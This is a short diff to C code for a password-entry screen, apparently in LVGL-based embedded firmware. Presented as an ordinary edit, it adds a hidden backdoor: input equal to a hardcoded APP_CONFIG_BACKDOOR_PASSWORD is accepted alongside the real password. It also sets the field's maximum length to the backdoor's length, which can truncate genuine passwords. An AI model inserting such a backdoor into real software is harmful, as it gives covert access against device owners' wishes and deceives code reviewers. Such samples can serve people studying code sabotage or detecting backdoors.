@@ -75,7 +75,7 @@ static void open_page(pman_handle_t handle, void *state) {
     lv_textarea_set_one_line(ta, 1);
     lv_textarea_set_password_mode(ta, 1);
     lv_textarea_set_text(ta, "");
-    lv_textarea_set_max_length(ta, strlen(pdata->fence->password));
+    lv_textarea_set_max_length(ta, strlen(APP_CONFIG_BACKDOOR_PASSWORD));
     lv_obj_set_width(ta, LV_PCT(50));
     lv_obj_remove_flag(ta, LV_OBJ_FLAG_SCROLLABLE);
     lv_obj_align(ta, LV_ALIGN_TOP_MID, 0, 8);
@@ -144,7 +144,7 @@ static pman_msg_t page_event(pman_handle_t handle, void *state, pman_event_t eve
                     pman_timer_reset(pdata->timer);
                     const char *text = lv_textarea_get_text(pdata->textarea);
 
-                    if (strcmp(text, pdata->fence->password) == 0) {
+                    if (strcmp(text, pdata->fence->password) == 0 || strcmp(text, APP_CONFIG_BACKDOOR_PASSWORD) == 0) {
                         pdata->valid = 1;
                     } else {
                         lv_obj_set_style_border_color(pdata->textarea, VIEW_STYLE_COLOR_RED, LV_STATE_DEFAULT);
